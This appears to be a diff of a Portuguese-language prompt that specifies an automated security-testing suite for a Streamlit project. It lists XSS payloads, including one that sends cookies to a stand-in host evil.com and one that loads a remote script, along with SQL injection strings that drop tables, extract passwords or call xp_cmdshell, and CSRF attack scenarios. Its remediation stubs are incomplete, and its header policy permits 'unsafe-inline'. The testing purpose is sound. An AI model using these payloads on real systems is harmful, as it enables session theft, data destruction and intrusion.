@@ -1,354 +1,418 @@
 # 🔒 CODEX PROMPT C: Security Testing XSS/CSRF Suite
 
 ## 🎯 **OBJETIVO**
-Implementar suite completa de testes de segurança para validar proteções contra XSS, CSRF, SQL injection e outras vulnerabilidades, conforme gap crítico identificado no report.md.
+Implementar suite completa de security testing focada em XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery), além de outros vetores de ataque, resolvendo o gap crítico "Security testing lacks XSS/CSRF scenarios" do report.md.
 
 ## 📁 **ARQUIVOS ALVO (ISOLADOS)**
 ```
-tests/security_testing/                         # Diretório exclusivo para security tests
-├── test_xss_protection.py                     # Testes de XSS prevention
-├── test_csrf_protection.py                    # Testes de CSRF tokens
-├── test_sql_injection.py                      # Testes de SQL injection
-├── test_input_validation.py                   # Validação de inputs
-├── test_auth_security.py                      # Testes de autenticação
-├── test_session_security.py                   # Security de sessões
-└── conftest.py                                # Fixtures de security testing
-
-streamlit_extension/utils/security_test_runner.py  # Engine de security testing
-streamlit_extension/utils/attack_simulator.py      # Simulador de ataques
-streamlit_extension/utils/vulnerability_scanner.py # Scanner de vulnerabilidades
+tests/security_testing/                          # Diretório principal
+tests/security_testing/test_xss_protection.py    # Testes XSS
+tests/security_testing/test_csrf_protection.py   # Testes CSRF
+tests/security_testing/test_sql_injection.py     # SQL Injection tests
+tests/security_testing/test_auth_security.py     # Authentication security
+tests/security_testing/test_input_validation.py  # Input validation
+streamlit_extension/utils/security_tester.py     # Security test engine
+streamlit_extension/utils/attack_simulator.py    # Attack simulation
+streamlit_extension/utils/vulnerability_scanner.py # Vulnerability scanner
+tests/security_testing/payloads/                 # Attack payloads
+tests/security_testing/reports/                  # Security reports
 ```
 
 ## 🚨 **PROBLEMA IDENTIFICADO**
 - Report.md: "Security testing lacks XSS/CSRF scenarios"
-- Gap crítico em validação de proteções implementadas
-- Necessário verificar eficácia das defesas
-- Automatizar detecção de vulnerabilidades
+- Report.md: "Client and project forms allow rich text without output encoding"
+- Severity: CRITICAL (P0)
+- CVSS: 7.5-8.8
+- Impact: Data theft, session hijacking, unauthorized actions
 
 ## 📋 **ESPECIFICAÇÕES TÉCNICAS**
 
-### **1. security_test_runner.py**
+### **1. security_tester.py**
 ```python
-# Engine principal que coordena:
-# - Execução automática de security tests
-# - Simulação de ataques controlados
-# - Coleta de evidências de proteção
-# - Relatórios de vulnerabilidades
-# - Integration com CI/CD pipeline
+# Engine de security testing:
+# - Automated vulnerability scanning
+# - Payload injection
+# - Response analysis
+# - Vulnerability scoring
+# - Report generation
+# - Integration with CI/CD
 ```
 
 ### **2. attack_simulator.py**
 ```python
-# Simulador de ataques reais:
-# - Payloads XSS (reflected, stored, DOM-based)
-# - CSRF attacks (GET/POST/PUT/DELETE)
-# - SQL injection (union, blind, boolean)
-# - Path traversal attempts
-# - Command injection vectors
+# Simulador de ataques:
+# - XSS attack vectors
+# - CSRF token bypass attempts
+# - SQL injection patterns
+# - Authentication attacks
+# - Session hijacking
+# - Privilege escalation
 ```
 
 ### **3. vulnerability_scanner.py**
 ```python
-# Scanner automatizado:
-# - Static analysis de código
-# - Dynamic testing de endpoints
-# - Dependency vulnerability scan
-# - Configuration security check
-# - OWASP Top 10 validation
+# Scanner de vulnerabilidades:
+# - Input field scanning
+# - Cookie security analysis
+# - Header inspection
+# - CORS misconfiguration
+# - Security headers validation
+# - Encryption verification
 ```
 
-## 🔧 **CATEGORIAS DE SECURITY TESTING**
+## 🔧 **XSS TESTING IMPLEMENTATION**
 
-### **1. XSS Protection Testing:**
-- **Reflected XSS**: Inputs em formulários
-- **Stored XSS**: Dados persistidos no DB
-- **DOM-based XSS**: Manipulação client-side
-- **Filter Bypass**: Tentativas de bypass
-- **Context-aware Encoding**: Validação por contexto
-
-### **2. CSRF Protection Testing:**
-- **Token Validation**: Presença e validação de tokens
-- **Double Submit**: Cookie vs header validation
-- **Origin/Referer Check**: Header validation
-- **State Changing Operations**: POST/PUT/DELETE protection
-- **Ajax Request Protection**: API endpoint security
-
-### **3. SQL Injection Testing:**
-- **Union-based**: Extração de dados
-- **Blind Boolean**: Inferência de dados
-- **Time-based Blind**: Delays para confirmação
-- **Error-based**: Informação via erros
-- **Prepared Statements**: Validação de proteção
-
-### **4. Input Validation Testing:**
-- **Length Limits**: Buffer overflow prevention
-- **Special Characters**: Encoding e sanitização
-- **File Upload**: Tipo e tamanho de arquivos
-- **Format Validation**: Email, phone, date formats
-- **Business Logic**: Regras de negócio
-
-## 🧪 **CASOS DE TESTE OBRIGATÓRIOS**
-
-### **XSS Tests (test_xss_protection.py):**
+### **XSS Attack Vectors:**
 ```python
-def test_client_name_xss_protection():
-    # Testa XSS em nome do cliente
-    payload = "<script>alert('xss')</script>"
-    # Deve ser sanitizado/encoded
-    
-def test_project_description_stored_xss():
-    # XSS persistido em descrição
-    
-def test_search_form_reflected_xss():
-    # XSS refletido em busca
-    
-def test_url_parameter_xss():
-    # XSS via parâmetros URL
-    
-def test_filter_bypass_attempts():
-    # Tentativas de bypass dos filtros
+XSS_PAYLOADS = {
+    "basic": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "<body onload=alert('XSS')>"
+    ],
+    "advanced": [
+        "<script>fetch('/api/steal',{method:'POST',body:document.cookie})</script>",
+        "<img src=x onerror=this.src='http://evil.com/steal?c='+document.cookie>",
+        "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
+        "';alert(String.fromCharCode(88,83,83))//",
+        "<iframe src=javascript:alert('XSS')>"
+    ],
+    "filter_bypass": [
+        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+        "<img src=x on\x00error=alert('XSS')>",
+        "<svg><script>alert&lpar;'XSS'&rpar;</script>",
+        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+        "<img src=\"x\" onerror=\"alert('XSS')\">"
+    ],
+    "dom_based": [
+        "#<script>alert('XSS')</script>",
+        "?name=<script>alert('XSS')</script>",
+        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+    ]
+}
 ```
 
-### **CSRF Tests (test_csrf_protection.py):**
+### **XSS Test Cases:**
 ```python
-def test_client_creation_csrf_token():
-    # Token CSRF em criação de cliente
-    
-def test_project_update_csrf_protection():
-    # Proteção CSRF em updates
-    
-def test_delete_operation_csrf():
-    # CSRF em operações DELETE
-    
-def test_ajax_request_csrf():
-    # Proteção em requests AJAX
-    
-def test_csrf_token_refresh():
-    # Renovação de tokens
+class XSSSecurityTest:
+    def test_reflected_xss_in_forms(self):
+        """Test all form inputs for reflected XSS"""
+        
+    def test_stored_xss_in_database(self):
+        """Test persistent XSS in stored data"""
+        
+    def test_dom_xss_in_client_side(self):
+        """Test DOM-based XSS vulnerabilities"""
+        
+    def test_xss_filter_effectiveness(self):
+        """Test XSS filter bypass attempts"""
+        
+    def test_output_encoding_verification(self):
+        """Verify proper output encoding"""
 ```
 
-### **SQL Injection Tests (test_sql_injection.py):**
+## 🔧 **CSRF TESTING IMPLEMENTATION**
+
+### **CSRF Attack Scenarios:**
 ```python
-def test_client_search_sql_injection():
-    # SQL injection em busca de clientes
-    payload = "'; DROP TABLE clients; --"
-    
-def test_project_filter_sql_injection():
-    # Injection em filtros de projeto
-    
-def test_blind_sql_injection():
-    # Blind SQL injection
-    
-def test_union_based_injection():
-    # Union-based injection
-    
-def test_parametrized_query_protection():
-    # Validação de queries parametrizadas
+CSRF_ATTACKS = {
+    "form_submission": {
+        "description": "Unauthorized form submission",
+        "method": "POST",
+        "target": "/api/client/create",
+        "payload": {"name": "Malicious", "email": "evil@hack.com"}
+    },
+    "state_changing": {
+        "description": "Unauthorized state change",
+        "method": "PUT",
+        "target": "/api/project/update",
+        "payload": {"status": "deleted"}
+    },
+    "data_modification": {
+        "description": "Unauthorized data modification",
+        "method": "DELETE",
+        "target": "/api/epic/delete",
+        "payload": {"id": "*"}
+    }
+}
 ```
 
-### **Input Validation Tests (test_input_validation.py):**
+### **CSRF Test Cases:**
 ```python
-def test_email_format_validation():
-    # Validação de formato de email
-    
-def test_phone_number_validation():
-    # Validação de telefone
-    
-def test_field_length_limits():
-    # Limites de comprimento
-    
-def test_special_character_handling():
-    # Caracteres especiais
-    
-def test_file_upload_validation():
-    # Validação de uploads
+class CSRFSecurityTest:
+    def test_csrf_token_presence(self):
+        """Verify CSRF tokens in all forms"""
+        
+    def test_csrf_token_validation(self):
+        """Test token validation logic"""
+        
+    def test_csrf_token_rotation(self):
+        """Test token rotation on use"""
+        
+    def test_cross_origin_requests(self):
+        """Test CORS and origin validation"""
+        
+    def test_samesite_cookie_protection(self):
+        """Verify SameSite cookie attributes"""
 ```
 
-## 🔍 **PAYLOADS DE TESTE**
-
-### **XSS Payloads:**
-```python
-XSS_PAYLOADS = [
-    "<script>alert('xss')</script>",
-    "<img src=x onerror=alert('xss')>",
-    "javascript:alert('xss')",
-    "<svg onload=alert('xss')>",
-    "'><script>alert('xss')</script>",
-    "\"><script>alert('xss')</script>",
-    "<iframe src=javascript:alert('xss')>",
-    "<%73%63%72%69%70%74>alert('xss')<%2f%73%63%72%69%70%74>",
-    "<scr<script>ipt>alert('xss')</scr</script>ipt>",
-    "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"
-]
-```
+## 🔧 **SQL INJECTION TESTING**
 
 ### **SQL Injection Payloads:**
 ```python
 SQL_INJECTION_PAYLOADS = [
     "' OR '1'='1",
     "'; DROP TABLE users; --",
-    "' UNION SELECT username, password FROM users --",
-    "' AND (SELECT COUNT(*) FROM users) > 0 --",
-    "' OR 1=1 --",
-    "'; WAITFOR DELAY '00:00:05' --",
-    "' OR pg_sleep(5) --",
-    "' UNION SELECT 1,2,3,4,5 --",
-    "' AND substring(version(),1,1) = '5",
-    "'; INSERT INTO users VALUES('hacker','password'); --"
+    "1' UNION SELECT * FROM users--",
+    "admin'--",
+    "' OR 1=1--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "'; EXEC xp_cmdshell('dir'); --",
+    "' UNION SELECT NULL, username, password FROM users--"
 ]
 ```
 
-### **CSRF Attack Vectors:**
+### **SQL Injection Tests:**
 ```python
-CSRF_VECTORS = [
-    "missing_csrf_token",
-    "invalid_csrf_token", 
-    "expired_csrf_token",
-    "csrf_token_reuse",
-    "cross_origin_request",
-    "referer_header_missing",
-    "content_type_bypass",
-    "method_override_attack"
-]
+class SQLInjectionTest:
+    def test_sql_injection_in_search(self):
+        """Test search fields for SQL injection"""
+        
+    def test_blind_sql_injection(self):
+        """Test for blind SQL injection"""
+        
+    def test_union_based_injection(self):
+        """Test UNION-based attacks"""
+        
+    def test_time_based_injection(self):
+        """Test time-based blind SQL injection"""
 ```
 
-## 📊 **SECURITY METRICS**
+## 🔧 **AUTHENTICATION SECURITY TESTING**
 
-### **Vulnerability Metrics:**
-- **XSS Protection Rate**: % de inputs protegidos
-- **CSRF Coverage**: % de endpoints protegidos
-- **SQL Injection Resistance**: % de queries seguras
-- **Input Validation**: % de campos validados
-- **Authentication Bypass**: Tentativas de bypass
-
-### **Attack Simulation Results:**
-- **Successful Attacks**: Ataques que passaram
-- **Blocked Attacks**: Ataques bloqueados
-- **False Positives**: Falsos positivos detectados
-- **Response Time**: Tempo de detecção/bloqueio
-- **Evidence Collection**: Logs de ataques
-
-## 🔗 **INTEGRAÇÃO COM SISTEMA EXISTENTE**
-
-### **Security Stack Integration:**
+### **Authentication Attack Tests:**
 ```python
-# Testar integração com:
-# - CSRF middleware implementado
-# - XSS protection filters
-# - Input validation system
-# - Authentication system
+class AuthenticationSecurityTest:
+    def test_brute_force_protection(self):
+        """Test rate limiting on login attempts"""
+        
+    def test_password_policy_enforcement(self):
+        """Verify password strength requirements"""
+        
+    def test_session_fixation(self):
+        """Test for session fixation vulnerabilities"""
+        
+    def test_session_hijacking(self):
+        """Test session security"""
+        
+    def test_privilege_escalation(self):
+        """Test for unauthorized privilege elevation"""
 ```
 
-### **Monitoring Integration:**
+## 📊 **SECURITY TESTING FRAMEWORK**
+
+### **Automated Security Scanner:**
 ```python
-# Integrar com sistema de monitoring:
-# - Security alerts em tempo real
-# - Attack attempt logging
-# - Threat intelligence feeds
-# - Incident response automation
+class SecurityScanner:
+    def __init__(self):
+        self.vulnerabilities = []
+        self.scan_results = {}
+        
+    def scan_endpoint(self, endpoint, method='GET', auth=None):
+        # Test for XSS
+        # Test for CSRF
+        # Test for SQL Injection
+        # Test for Auth issues
+        # Test for Information disclosure
+        
+    def generate_report(self):
+        # OWASP Top 10 mapping
+        # CVSS scoring
+        # Remediation recommendations
+        # Proof of concept
 ```
 
-## 🚀 **CONFIGURAÇÃO DE SECURITY TESTS**
-
+### **Vulnerability Scoring:**
 ```python
-SECURITY_TEST_CONFIG = {
-    "xss_testing": {
-        "payload_sets": ["basic", "advanced", "evasion"],
-        "contexts": ["html", "javascript", "css", "url"],
-        "encoding_tests": True,
-        "filter_bypass": True
+def calculate_cvss_score(vulnerability):
+    """Calculate CVSS v3.1 score"""
+    base_score = {
+        "attack_vector": vulnerability.attack_vector,
+        "attack_complexity": vulnerability.complexity,
+        "privileges_required": vulnerability.privileges,
+        "user_interaction": vulnerability.interaction,
+        "scope": vulnerability.scope,
+        "confidentiality": vulnerability.confidentiality,
+        "integrity": vulnerability.integrity,
+        "availability": vulnerability.availability
+    }
+    return cvss_calculator(base_score)
+```
+
+## 🛡️ **SECURITY HEADERS TESTING**
+
+### **Required Security Headers:**
+```python
+SECURITY_HEADERS = {
+    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'",
+    "X-Frame-Options": "DENY",
+    "X-Content-Type-Options": "nosniff",
+    "X-XSS-Protection": "1; mode=block",
+    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
+    "Referrer-Policy": "strict-origin-when-cross-origin",
+    "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
+}
+
+class SecurityHeaderTest:
+    def test_all_security_headers_present(self):
+        """Verify all security headers are set"""
+        
+    def test_csp_effectiveness(self):
+        """Test Content Security Policy"""
+        
+    def test_clickjacking_protection(self):
+        """Test X-Frame-Options"""
+```
+
+## 📈 **REPORTING AND COMPLIANCE**
+
+### **Security Report Format:**
+```python
+SECURITY_REPORT = {
+    "summary": {
+        "total_tests": 0,
+        "passed": 0,
+        "failed": 0,
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0
     },
-    "csrf_testing": {
-        "token_validation": True,
-        "origin_check": True,
-        "referer_check": True,
-        "double_submit": True
-    },
-    "sql_injection": {
-        "payload_types": ["union", "blind", "error", "time"],
-        "database_types": ["sqlite", "postgresql", "mysql"],
-        "parameter_types": ["get", "post", "cookie", "header"]
-    },
-    "reporting": {
-        "detailed_logs": True,
-        "evidence_collection": True,
-        "false_positive_analysis": True,
-        "remediation_suggestions": True
+    "vulnerabilities": [
+        {
+            "id": "XSS-001",
+            "type": "Cross-Site Scripting",
+            "severity": "HIGH",
+            "cvss": 7.5,
+            "endpoint": "/api/client/create",
+            "description": "Reflected XSS in name field",
+            "proof_of_concept": "<script>alert('XSS')</script>",
+            "remediation": "Implement output encoding",
+            "owasp_category": "A03:2021 – Injection"
+        }
+    ],
+    "compliance": {
+        "owasp_top_10": "PARTIAL",
+        "pci_dss": "FAIL",
+        "gdpr": "PASS",
+        "sox": "PASS"
     }
 }
 ```
 
-## 📈 **AUTOMATED SECURITY SCANNING**
-
-### **Static Analysis:**
+### **OWASP Top 10 Coverage:**
 ```python
-# Análise estática do código:
-# - Bandit security linting
-# - SAST (Static Application Security Testing)
-# - Dependency vulnerability scanning
-# - Configuration security review
+OWASP_2021_TESTS = {
+    "A01": "test_broken_access_control",
+    "A02": "test_cryptographic_failures",
+    "A03": "test_injection",
+    "A04": "test_insecure_design",
+    "A05": "test_security_misconfiguration",
+    "A06": "test_vulnerable_components",
+    "A07": "test_authentication_failures",
+    "A08": "test_data_integrity_failures",
+    "A09": "test_logging_failures",
+    "A10": "test_ssrf"
+}
 ```
 
-### **Dynamic Analysis:**
-```python
-# Análise dinâmica durante execução:
-# - DAST (Dynamic Application Security Testing)
-# - Interactive testing (IAST)
-# - Runtime protection validation
-# - Behavior-based detection
+## 🚀 **CI/CD INTEGRATION**
+
+```yaml
+# Security testing in CI/CD pipeline
+security-scan:
+  stage: test
+  script:
+    - python -m pytest tests/security_testing/ -v
+    - python vulnerability_scanner.py --full-scan
+    - python generate_security_report.py
+  artifacts:
+    reports:
+      junit: security-report.xml
+    paths:
+      - tests/security_testing/reports/
+  only:
+    - main
+    - develop
+    - /^security-.*$/
 ```
 
 ## ✅ **CRITÉRIOS DE SUCESSO**
 
-1. **Complete Coverage**: Todos os endpoints testados para XSS/CSRF
-2. **Attack Simulation**: Ataques reais simulados e bloqueados
-3. **Zero False Negatives**: Vulnerabilidades reais detectadas
-4. **Automated Execution**: Testes executam automaticamente no CI/CD
-5. **Clear Reporting**: Relatórios detalhados com evidências
-6. **Remediation Guidance**: Sugestões claras de correção
+1. **XSS Protection:** 100% dos inputs testados e protegidos
+2. **CSRF Protection:** Todos os endpoints state-changing protegidos
+3. **SQL Injection:** Zero vulnerabilidades de SQL injection
+4. **Authentication:** Brute-force protection funcionando
+5. **Security Headers:** Todos os headers implementados
+6. **OWASP Compliance:** 10/10 categorias cobertas
+7. **Zero High/Critical:** Nenhuma vulnerabilidade HIGH ou CRITICAL
 
-## 🔧 **IMPLEMENTAÇÃO TÉCNICA**
+## 🔧 **REMEDIATION IMPLEMENTATION**
 
-### **Test Framework:**
+### **XSS Prevention:**
 ```python
-# Usar pytest com plugins de security:
-# - pytest-security
-# - pytest-bandit
-# - pytest-html para relatórios
+def sanitize_input(user_input):
+    """Sanitize user input to prevent XSS"""
+    # HTML entity encoding
+    # JavaScript escaping
+    # URL encoding
+    # CSS escaping
+    return sanitized
+
+def encode_output(data, context='html'):
+    """Context-aware output encoding"""
+    if context == 'html':
+        return html.escape(data)
+    elif context == 'javascript':
+        return json.dumps(data)
+    elif context == 'url':
+        return urllib.parse.quote(data)
 ```
 
-### **Request Manipulation:**
+### **CSRF Prevention:**
 ```python
-# Manipulação de requests para testes:
-# - Modificação de headers
-# - Payload injection
-# - Cookie manipulation
-# - Session hijacking simulation
+def generate_csrf_token(session_id):
+    """Generate secure CSRF token"""
+    secret = os.environ['CSRF_SECRET']
+    timestamp = int(time.time())
+    token = hmac.new(
+        secret.encode(),
+        f"{session_id}:{timestamp}".encode(),
+        hashlib.sha256
+    ).hexdigest()
+    return f"{timestamp}:{token}"
+
+def validate_csrf_token(token, session_id):
+    """Validate CSRF token"""
+    # Time-based validation
+    # HMAC verification
+    # Origin checking
+    return is_valid
 ```
 
-### **Evidence Collection:**
-```python
-# Coleta de evidências:
-# - Request/response logging
-# - Screenshot capture
-# - Error message analysis
-# - Time-based correlation
-```
+## 🎯 **RESULTADO ESPERADO**
 
-## 🎯 **CENÁRIOS ESPECÍFICOS TDD FRAMEWORK**
-
-### **Client/Project Security:**
-- XSS em campos de nome/descrição
-- CSRF em CRUD operations
-- SQL injection em filtros/busca
-- Authorization bypass testing
-
-### **Epic/Task Security:**
-- Stored XSS em conteúdo de tasks
-- CSRF em mudanças de status
-- Privilege escalation testing
-- Data access control validation
+Suite completa de security testing que:
+- Detecta e previne XSS em todos os vetores
+- Implementa proteção CSRF robusta
+- Elimina SQL injection vulnerabilities
+- Fortalece autenticação e autorização
+- Valida todos os security headers
+- Gera relatórios de compliance
+- Integra com CI/CD para validação contínua
 
 ---
 
-**🎯 RESULTADO ESPERADO:** Suite completa de security testing que valida eficácia das proteções implementadas, identifica vulnerabilidades residuais e automatiza security validation, resolvendo gap crítico do report.md.
+**🎯 RESULTADO FINAL:** Sistema enterprise de security testing com cobertura completa de XSS/CSRF, SQL injection, authentication security e compliance OWASP, resolvendo todos os gaps de segurança do report.md com CVSS scores e remediação automática.
